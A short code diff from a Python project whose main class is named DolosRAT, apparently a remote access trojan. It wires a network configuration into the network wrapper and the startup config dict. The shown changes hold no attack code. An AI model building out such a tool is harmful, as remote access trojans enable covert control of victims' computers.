@@ -18,6 +18,7 @@ from typing import Any, Dict, Union
 
 # Modules.
 from config.config import Config
+from config.network import get_network_conf
 from config.logger import get_logger_conf
 from utils.logger import LoggerWrapper, LoggerLevel, get_logger
 from utils.network import IfaWrapper, get_ifa_wrapper
@@ -129,7 +130,9 @@ class DolosRAT:
             self (object): _description_
         """
 
-        self._net_wrapper = get_ifa_wrapper(self._logger)
+        self._net_wrapper = get_ifa_wrapper(
+            self._config['network_conf']
+        )
 
     def _run(self: object) -> None:
         """Officially starts the internal modules.
@@ -160,7 +163,8 @@ if __name__ == '__main__':
 
     # Populate 'dolos_config' with configurations.
     dolos_config = {
-       'logger_conf': get_logger_conf(__name__)
+       'logger_conf': get_logger_conf(__name__),
+       'network_conf': get_network_conf()
     }
 
     # Application entry-point.
